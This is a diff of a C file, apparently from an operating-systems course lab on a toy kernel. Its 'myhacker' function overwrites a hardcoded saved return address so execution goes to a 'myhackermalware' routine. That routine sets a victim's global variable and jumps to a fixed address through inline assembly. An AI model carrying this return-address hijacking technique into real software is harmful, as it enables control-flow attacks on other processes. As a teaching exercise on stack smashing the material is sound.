@@ -3,7 +3,6 @@
 #include <stdio.h>
 /*------------------------------------------------------------------------
  *  myhacker  -  is the hacker method that smashes stack of myvictim
-
  *------------------------------------------------------------------------
  */
 
@@ -17,12 +16,13 @@ void myhacker(int y)
 	kprintf("Process MYHACKER 's Base is 0x%x, stack pointer is 0x%x ", prptr->prstkbase, prptr->prstkptr);
 	unsigned int * address = 0xfdefbb4;
 	kprintf("return address is -------- 0x%x", *address);
-	*(address) = &myhackermalware+1 ;
+	*(address) = &myhackermalware+6 ;
 }
 
 void myhackermalware(int z)
 {
-
-	kprintf("\n WTFFFFFF is location to go back ");
-	asm ("pushl %0;ret; ": /* No outputs. */:"r"( 0x10240d)	/* y is output operand */);
+	unsigned int * address = 0x119004;
+	*address = 0x1;
+	kprintf("\n Location of victimGlobal MHACK 0x%x, its value is %d ", &victimglobal, *address );
+	asm ("jmp %0; ": /* No outputs. */:"r"(0x102476)	/* y is output operand */);
 }
